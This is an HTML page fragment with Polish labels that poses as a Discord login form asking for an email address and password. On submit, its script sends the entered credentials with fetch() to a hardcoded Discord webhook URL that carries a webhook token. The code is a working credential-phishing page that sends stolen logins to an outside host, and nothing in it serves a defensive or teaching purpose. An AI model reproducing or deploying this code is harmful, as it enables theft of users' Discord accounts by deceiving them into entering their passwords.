<!-- Formularz logowania i wysyłania -->
<form id="discordLoginForm" style="margin-top:20px; padding:10px; border:1px solid #ccc; max-width:400px;">
  <h3>Zaloguj Się Do Discord</h3>
  <input type="text" id="discordUsername" placeholder="Wpisz swój adres e-mail" required style="width:70%; padding:8px; margin-bottom:10px;"/>
  <input type="text" id="discordMessage" placeholder="Wpisz Hasło" required style="width:70%; padding:8px; margin-bottom:10px;"/>
  <button type="submit" style="padding:8px 12px;">Zaloguj się</button>
</form>

<!-- Skrypt do obsługi -->
<script>
document.getElementById('discordLoginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const username = document.getElementById('discordUsername').value;
  const message = document.getElementById('discordMessage').value;

  // Tworzymy treść wiadomości z nazwy i tekstu
  const content = `**${username}** napisał: ${message}`;

  fetch('https://discord.com/api/webhooks/1533815456048087111/6OHBmfADsFerRQLmsTbz5neIxqgrQSooZix1aI5K6O3a9PD5pBYOEdnMf3z38dk6Vr-v', { // zamień na swój webhook URL
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: content }) // wysyłamy jako JSON
  })
  .then(response => {
    if(response.ok) {
      alert('Dane Wysłane Poczekaj!!');
    } else {
      alert('Błąd podczas wysyłania!');
    }
  })
  .catch(error => alert('Błąd: ' + error));
});
</script>
